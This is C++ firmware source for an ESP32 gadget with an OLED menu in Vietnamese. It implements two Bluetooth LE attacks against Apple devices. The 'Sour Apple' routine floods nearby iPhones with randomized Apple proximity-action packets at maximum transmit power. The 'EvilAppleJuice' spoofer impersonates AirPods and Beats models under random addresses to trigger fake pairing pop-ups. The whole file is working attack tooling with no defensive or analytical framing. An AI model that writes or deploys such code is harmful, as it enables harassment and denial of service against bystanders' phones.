#include "bleconfig.h"
#include "ui.h"

enum BLE_Page {
  SOURAPPLE_BLE_PAGE,
  SPOOFER_BLE_PAGE,
  IDLE
};

BLE_Page currentPage = IDLE;
unsigned long lastDebounceTime = 0;
unsigned long debounceDelay = 500;
int spooferdevicemode = 1;
int spooferdevicetype = 1;
bool spooferdevicemodechoose = false;
bool sourapplebleRunning = false;
bool spooferdevicebleRunning = false;

BLEAdvertising *Advertising;
uint8_t packet[17];

BLEAdvertising *sAdvertising;
uint8_t* data;
esp_ble_adv_type_t advType;

void handleButtonPress(int pin, void (*callback)) {
  static unsigned long lastPressTime[8] = {0};
  static uint8_t lastState[8] = {HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH, HIGH};

  int index = pin % 8;
  uint8_t currentState = digitalRead(pin);

  if (currentState == LOW && lastState[index] == HIGH) {
    unsigned long currentTime = millis();

    if ((currentTime - lastPressTime[index]) > debounceDelay) {
      callback();
      lastPressTime[index] = currentTime;
    }
  }

  lastState[index] = currentState;
}

void drawBleStatus() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  if (currentPage == SOURAPPLE_BLE_PAGE) {
    display.println("BLE Sour Apple");
    display.println(sourapplebleRunning ? "Dang phat BLE..." : "Tam dung.");
  }
  if (currentPage == SPOOFER_BLE_PAGE) {
    display.println("BLE Spoofer Devices");
    display.println(spooferdevicebleRunning ? "Dang phat BLE..." : "Xong");
  }
  display.display();
}

/*
  SourApple By RapierXbox
*/

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData advertisementData = BLEAdvertisementData();
  uint8_t i = 0;

  packet[i++] = 17 - 1;                             // Packet Length
  packet[i++] = 0xFF;                               // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;                               // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;                               // ...
  packet[i++] = 0x0F;                               // Type
  packet[i++] = 0x05;                               // Length
  packet[i++] = 0xC1;                               // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];      // Action Type
  esp_fill_random(&packet[i], 3);                   // Authentication Tag
  i += 3;
  packet[i++] = 0x00;                               // ???
  packet[i++] = 0x00;                               // ???
  packet[i++] =  0x10;                              // Type ???
  esp_fill_random(&packet[i], 3);

  advertisementData.addData(std::string((char *)packet, 17));
  return advertisementData;
}

void sourappleSetup() {
  currentPage = SOURAPPLE_BLE_PAGE;
  digitalWrite(STATUS_LED, HIGH);
  sourapplebleRunning = true;
  feature_exit_requested = true;
  BLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN , ESP_PWR_LVL_P9);
  BLEServer *pServer = BLEDevice::createServer();
  Advertising = pServer->getAdvertising();
  drawBleStatus();
}

void sourappleLoop() {
  BLEAdvertisementData oAdvertisementData = getOAdvertisementData();
  Advertising->setAdvertisementData(oAdvertisementData);
  Advertising->setMinInterval(0x20);
  Advertising->setMaxInterval(0x20);
  Advertising->setMinPreferred(0x20);
  Advertising->setMaxPreferred(0x20);
  Advertising->start();
  delay(40);
  Advertising->stop();
}

void sourappleUnloop() {
  digitalWrite(STATUS_LED, LOW);
  sourapplebleRunning = false;
  Advertising->stop();
  BLEDevice::deinit();
  drawBleStatus();
}

/*
  Spoofer Devices (EvilAppleJuice) By ckcr4lyf
*/

void spooferdeviceSetup() {
  feature_exit_requested = true;
  BLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  BLEServer *sServer = BLEDevice::createServer();
  sAdvertising = sServer->getAdvertising();
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  sAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void spooferdevicePreActivate() {
  spooferdevicebleRunning = true;
  drawBleStatus();
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
  oAdvertisementData.addData(std::string((char*)data, 31));
  sAdvertising->setAdvertisementType(advType);
  sAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  sAdvertising->setAdvertisementData(oAdvertisementData);
  sAdvertising->start();
  delay(2000);
  sAdvertising->stop();
  spooferdevicebleRunning = false;
  drawBleStatus();
  digitalWrite(STATUS_LED, LOW);
  BLEDevice::deinit();
}

/*
  UI
*/

/*
  Spoofer UI
*/

void BLE_return_to_mainmenu() {
  currentPage = IDLE;
  spooferdevicemodechoose = false;
  spooferdevicetype = 1;
  spooferdevicemode = 1;
  drawMainMenu();
  handleMenuButton();
}

void setAdvertisingMode() {
  switch (spooferdevicemode) {
    case 1:
      advType = ADV_TYPE_SCAN_IND;
      break;
    case 2:
      advType = ADV_TYPE_IND;
      break;
    case 3:
      advType = ADV_TYPE_DIRECT_IND_HIGH;
      break;
    case 4:
      advType = ADV_TYPE_DIRECT_IND_LOW;
      break;
    case 5:
      advType = ADV_TYPE_NONCONN_IND;
      break;
    default:
      advType = ADV_TYPE_SCAN_IND;
      break;
  }
}

void drawBLESpooferDeviceList() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.println("Chon DV De Phat BLE");
  switch (spooferdevicetype) {
    case 1: display.println("[ AirPods ]"); break;
    case 2: display.println("[ AirPods Pro ]"); break;
    case 3: display.println("[ AirPods Max ]"); break;
    case 4: display.println("[ Airpods Gen 2 ]"); break;
    case 5: display.println("[ Airpods Gen 3 ]"); break;
    case 6: display.println("[ Airpods Pro Gen 2 ]"); break;
    case 7: display.println("[ PowerBeats ]"); break;
    case 8: display.println("[ PowerBeats Pro ]"); break;
    case 9: display.println("[ Beats Solo Pro ]"); break;
    case 10: display.println("[ Beats Buds ]"); break;
    case 11: display.println("[ Beats Flex ]"); break;
    case 12: display.println("[ BeatsX ]"); break;
    case 13: display.println("[ Beats Solo3 ]"); break;
    case 14: display.println("[ Beats Studio3 ]"); break;
    case 15: display.println("[ Beats StudioPro ]"); break;
    case 16: display.println("[ Beats FitPro ]"); break;
    case 17: display.println("[ Beats BudsPlus ]"); break;
    case 18: display.println("[ AirTags ]"); break;
    default: display.println("[ AirPods ]"); break;
  }
  display.println("Chon che do phat BLE");
  switch (spooferdevicemode) {
    case 1: display.println("[ADV_TYPE_SCAN_IND]"); break;
    case 2: display.println("[ADV_TYPE_IND]"); break;
    case 3: display.println("[ADV_TYPE_D_IND_HIGH]"); break;
    case 4: display.println("[ADV_TYPE_D_IND_LOW]"); break;
    case 5: display.println("[ADV_TYPE_NONCON_IND]"); break;
    default: display.println("[ADV_TYPE_SCAN_IND]"); break;
  }
  display.display();
} 

void setAdvertisingData() {
  switch (spooferdevicetype) {
    case 1:
      data = dataAirpods;
    break;
    case 2:
      data = dataAirpodsPro;
      break;
    case 3:
      data = dataAirpodsMax;
      break;
    case 4:
      data = dataAirpodsGen2;
      break;
    case 5:
      data = dataAirpodsGen3;
      break;
    case 6:
      data = dataAirpodsProGen2;
      break;
    case 7:
      data = dataPowerBeats;
      break;
    case 8:
      data = dataPowerBeatsPro;
      break;
    case 9:
      data = dataBeatsSoloPro;
      break;
    case 10:
      data = dataBeatsStudioBuds;
      break;
    case 11:
      data = dataBeatsFlex;
      break;
    case 12:
      data = dataBeatsX;
      break;
    case 13:
      data = dataBeatsSolo3;
      break;
    case 14:
      data = dataBeatsStudio3;
      break;
    case 15:
      data = dataBeatsStudioPro;
      break;
    case 16:
      data = dataBeatsFitPro;
      break;
    case 17:
      data = dataBeatsStudioBudsPlus;
      break;
    default:
      data = dataAirpods;
      break;
    drawBLESpooferDeviceList();
  }
}


void changeDeviceTypeNext() {
  spooferdevicetype++;
  if (spooferdevicetype > 17) spooferdevicetype = 1;
  Serial.println("Device Type Next: " + String(spooferdevicetype));
  setAdvertisingData();
  drawBLESpooferDeviceList();
}

void changeDeviceTypePrev() {
  spooferdevicetype--;
  if (spooferdevicetype < 1) spooferdevicetype = 17;
  Serial.println("Device Type Prev: " + String(spooferdevicetype));
  setAdvertisingData();
  drawBLESpooferDeviceList();
}

void changeAdvTypeNext() {
  advType++;
  if (advType > 5) advType = 1;
  Serial.println("Advertising Type Next: " + String(advType));
  setAdvertisingMode();
  drawBLESpooferDeviceList();
}

void changeAdvTypePrev() {
  advType--;
  if (advType < 1) advType = 5;
  Serial.println("Advertising Type Prev: " + String(advType));
  setAdvertisingMode();
  drawBLESpooferDeviceList();
}

void spoofer_mid_button_utils() {
  spooferdevicemodechoose = true;
  drawBLESpooferDeviceList();
}

void spooferdevicePostActivate() {
  currentPage = SPOOFER_BLE_PAGE;
  if (!spooferdevicemodechoose) handleButtonPress(BTN_RIGHT, changeDeviceTypeNext);
  else handleButtonPress(BTN_RIGHT, changeAdvTypeNext);
  if (!spooferdevicemodechoose) handleButtonPress(BTN_LEFT, changeDeviceTypePrev);
  else handleButtonPress(BTN_LEFT, changeAdvTypePrev);
  if (!spooferdevicemodechoose) handleButtonPress(BTN_MID, spoofer_mid_button_utils);
  else {
    digitalWrite(STATUS_LED, HIGH);
    handleButtonPress(BTN_MID, spooferdevicePreActivate);
  } 
}

